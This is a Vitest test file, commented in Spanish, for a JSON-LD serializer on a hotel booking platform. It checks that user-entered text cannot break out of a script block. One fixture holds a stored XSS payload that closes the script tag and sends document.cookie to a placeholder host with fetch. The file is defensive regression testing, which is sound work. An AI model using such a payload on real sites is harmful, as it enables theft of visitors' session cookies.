// El navegador NO parsea el contenido de un `<script>` como JSON: primero busca
// el `</script>` que lo cierra. Un dato del JSON-LD que contenga esa cadena
// termina el bloque ahí, y lo que sigue se interpreta como HTML de la página.
//
// En Kora ese dato lo escribe el HOTELERO desde su panel —nombre de habitación,
// FAQ, reseñas, bloques de texto— y sale en su página pública, servida desde
// kora-hotel.com. Un script inyectado ahí corre en nuestro dominio (K-18.1).
//
// Estaba copiado en 38 páginas y sólo 4 escapaban. Ahora hay un componente.
import { describe, it, expect } from "vitest";
import { serializarJsonLd } from "@/lib/json-ld";

describe("el ataque que esto cierra", () => {
  const NOMBRE_ENVENENADO =
    'Suite Jungla</script><script>fetch("https://sitio/?c="+document.cookie)</script>';

  const salida = serializarJsonLd({
    "@context": "https://schema.org",
    "@type": "Hotel",
    name: NOMBRE_ENVENENADO,
  });

  it("no deja ni un `</script>` que cierre el bloque", () => {
    expect(salida.toLowerCase()).not.toContain("</script");
  });

  it("no deja ningún `<` crudo, que es el carácter que abre una etiqueta", () => {
    expect(salida).not.toContain("<");
  });

  it("el dato NO se pierde: Google lo lee igual", () => {
    // `\\u003c` dentro de una cadena JSON ES un `<`. Escapar no censura nada;
    // sólo impide que el navegador lo vea como el principio de una etiqueta.
    expect(JSON.parse(salida).name).toBe(NOMBRE_ENVENENADO);
  });
});

describe("serializarJsonLd", () => {
  it("escapa <, > y &", () => {
    const s = serializarJsonLd({ a: "<", b: ">", c: "&" });
    expect(s).toContain("\\u003c");
    expect(s).toContain("\\u003e");
    expect(s).toContain("\\u0026");
  });

  it("escapa los separadores de línea de JavaScript (U+2028 y U+2029)", () => {
    // Los separadores se escriben con secuencias de escape: pegados en crudo,
    // la herramienta que edita este archivo no los deja pasar.
    const SEP = "uno" + "\u2028" + "dos" + "\u2029" + "tres";
    const s = serializarJsonLd({ a: SEP });
    expect(s).toContain("\\u2028");
    expect(s).toContain("\\u2029");
    expect(s.includes("\u2028")).toBe(false);
    expect(s.includes("\u2029")).toBe(false);
    expect(JSON.parse(s).a).toBe(SEP);
  });

  it("sigue siendo JSON válido y equivalente al original", () => {
    const original = {
      "@context": "https://schema.org",
      "@type": "FAQPage",
      mainEntity: [
        { "@type": "Question", name: "¿Aceptan mascotas? <perros & gatos>" },
      ],
      precio: 1900,
      activo: true,
      nada: null,
    };
    expect(JSON.parse(serializarJsonLd(original))).toEqual(original);
  });

  it("aguanta acentos y emoji sin romperlos", () => {
    const d = { name: "Hotel Paraíso Encantado 🌿", ciudad: "Xilitla" };
    expect(JSON.parse(serializarJsonLd(d))).toEqual(d);
  });
});

describe("ninguna página vuelve a escribir el bloque a mano", () => {
  it("sólo el componente compartido usa `application/ld+json`", async () => {
    const { readFileSync } = await import("node:fs");
    const { join } = await import("node:path");
    const { execSync } = await import("node:child_process");
    const raiz = join(__dirname, "..");

    const hits = execSync(
      'grep -rl "application/ld+json" --include="*.tsx" app components || true',
      { cwd: raiz, encoding: "utf8" },
    )
      .split("\n")
      .filter(Boolean);

    // El único sitio donde puede aparecer esa cadena es el componente.
    expect(hits).toEqual(["components/shared/JsonLd.tsx"]);

    // Y el componente tiene que serializar con el ayudante, no con JSON.stringify.
    const comp = readFileSync(join(raiz, "components/shared/JsonLd.tsx"), "utf8");
    expect(comp).toContain("serializarJsonLd");
    expect(comp).not.toContain("JSON.stringify");
  });
});
